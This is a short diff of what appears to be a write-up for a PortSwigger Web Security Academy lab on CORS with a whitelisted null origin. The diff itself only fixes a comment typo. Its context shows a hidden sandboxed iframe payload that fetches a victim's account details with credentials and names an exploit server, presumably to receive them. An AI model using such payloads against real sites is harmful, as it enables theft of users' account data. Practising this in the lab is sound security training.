@@ -12,7 +12,7 @@ Lab link: https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-
 
 <iframe style="display: none" sandbox="allow-scripts" srcdoc="<script>
     const lab_serv = '0a5c008704a62b2f88a01c11004600fc' //Change burp exercise lab id accordingly
-    const exploit_serv =  '0ae3008a040b2b4388031bd4014c004c' //Change burp execrcise exploit id accordingly
+    const exploit_serv =  '0ae3008a040b2b4388031bd4014c004c' //Change burp exercise exploit id accordingly
     
     function reqListener() {
         fetch('https://' + lab_serv + '.web-security-academy.net/accountDetails', {credentials: 'include',}).then( async (response) => {
